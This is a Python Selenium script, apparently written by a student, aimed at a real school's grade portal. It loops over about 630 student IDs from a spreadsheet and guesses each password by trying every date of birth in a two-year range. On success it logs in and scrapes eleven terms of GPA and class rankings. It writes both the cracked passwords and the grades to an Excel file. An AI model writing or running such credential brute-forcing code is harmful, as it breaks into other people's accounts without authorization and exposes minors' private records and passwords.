from selenium import webdriver
from time import sleep
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.chrome.options import Options
import openpyxl
from pathlib import Path
from datetime import date, timedelta
import time

# Setting the path to the xlsx file:
xlsx_file = Path('A:/Documents/GitHub/Just-Try-A-Project/M6(2564).xlsx')
wb_obj = openpyxl.load_workbook(xlsx_file)
sheet = wb_obj.active

for student in range(4,634):
    # เก็บข้อมูลนักเรียน
    usr = sheet[f"B{student}"].value
    print(f"🧑🏻UID: {usr} ")

    URL = [
    "https://academic.skr.ac.th/grade/2564/1/",
    "https://academic.skr.ac.th/grade/2563/2/",
    "https://academic.skr.ac.th/grade/2563/1/",
    "https://academic.skr.ac.th/grade/2562/2/",
    "https://academic.skr.ac.th/grade/2562/1/",
    "https://academic.skr.ac.th/grade/2561/2/",
    "https://academic.skr.ac.th/grade/2561/1/",
    "https://academic.skr.ac.th/grade/2560/2/",
    "https://academic.skr.ac.th/grade/2560/1/",
    "https://academic.skr.ac.th/grade/2559/2/",
    "https://academic.skr.ac.th/grade/2559/1/"]

    GPA_LIST = ["AL","AI","AF","AC","Z","W","T","Q","N","K","H"]
    CLASS_RATING_LIST = ["AM","AJ","AG","AD","AA","X","U","R","O","L","I"]
    SCHOOL_RATING_LIST = ["AN","AK","AH","AE","AB","Y","V","S","P","M","J"]

    found_pass = 0
    pwd = ""
    stop_random = 0

    # หาเกรด 11 เทอม
    for i in range(11):
        driver = webdriver.Chrome(ChromeDriverManager().install())
        driver.get(URL[i])
        print(f"🔍 Opening: {URL[i]}")
        username_box = driver.find_element_by_id('ContentPlaceHolder1_TextBox1').send_keys(usr)
        
        # เช็คว่ามีรหัสไหม
        if found_pass == 0: # ไม่มีรหัส
            # สุ่มหารหัส
            start_date = date(2546, 1, 1)
            end_date = date(2547, 12, 31)
            delta = timedelta(days=1)
            while start_date <= end_date:
                start_date += delta
                pwd = start_date.strftime("%d/%m/%Y")

                try: # ถ้าเจอ ให้เก็บข้อมูล
                    password_box = driver.find_element_by_id('ContentPlaceHolder1_TextBox2').send_keys(pwd)
                    login_box = driver.find_element_by_id('ContentPlaceHolder1_Button1').click()
                    GPA = driver.find_element_by_xpath('/html/body/form/div[3]/div[2]/div/table[1]/tbody/tr[4]/td[2]/span').text
                    RATING = driver.find_element_by_xpath('/html/body/form/div[3]/div[2]/div/table[1]/tbody/tr[4]/td[4]/span').text
                    CLASS_RATING,SCHOOL_RATING = RATING.split("/")
                    print(f"✅ {pwd}")
                    found_pass = 1
                    break

                except: # ถ้ายังไม่เจอ ให้สุ่มต่อ
                    GPA = "ERROR"
                    CLASS_RATING = "ERROR"
                    SCHOOL_RATING = "ERROR"
                    stop_random += 1
                    try : # ถ้าเจอ SERVER ERROR
                        SERVER_ERROR = driver.find_element_by_xpath('/html/body/span/h1/text()').text # ตอนนี้มันไม่เจอ
                        print(SERVER_ERROR)
                        print("⚠ SERVER ERROR ⚠")
                        GPA = "SERVER ERROR"
                        CLASS_RATING = "SERVER ERROR"
                        SCHOOL_RATING = "SERVER ERROR"
                        driver.quit()
                        stop_random = 0
                        time.sleep(5)
                        driver = webdriver.Chrome(ChromeDriverManager().install())
                        driver.get(URL[i])
                    except: # ถ้าไม่เจอ
                        if stop_random >= 731:
                            print(f"❌ Password not found ❌")
                            GPA = "NOT FOUND"
                            CLASS_RATING = "NOT FOUND"
                            SCHOOL_RATING = "NOT FOUND"
                            pwd = "NOT FOUND"
                            break
                        print(f"❌ {pwd}")
                        continue
                
        elif found_pass == 1: # มีรหัส
            try:
                password_box = driver.find_element_by_id('ContentPlaceHolder1_TextBox2').send_keys(pwd)
                login_box = driver.find_element_by_id('ContentPlaceHolder1_Button1').click()
                GPA = driver.find_element_by_xpath('/html/body/form/div[3]/div[2]/div/table[1]/tbody/tr[4]/td[2]/span').text
                RATING = driver.find_element_by_xpath('/html/body/form/div[3]/div[2]/div/table[1]/tbody/tr[4]/td[4]/span').text
                CLASS_RATING,SCHOOL_RATING = RATING.split("/")
            except:
                pwd = "NOT SKR"
                GPA = "NOT SKR"
                CLASS_RATING = "NOT SKR"
                SCHOOL_RATING = "NOT SKR"
                print(f"❌❌ NOT SKR ❌❌")
                break

        # กรอกข้อมูลใน Excel
        sheet[f'G{student}'] = pwd
        sheet[f'{GPA_LIST[i]}{student}'] = GPA
        sheet[f'{CLASS_RATING_LIST[i]}{student}'] = CLASS_RATING
        sheet[f'{SCHOOL_RATING_LIST[i]}{student}'] = SCHOOL_RATING
        driver.quit()

    wb_obj.save('Grade(M6).xlsx')

print("ℹ Program Finished")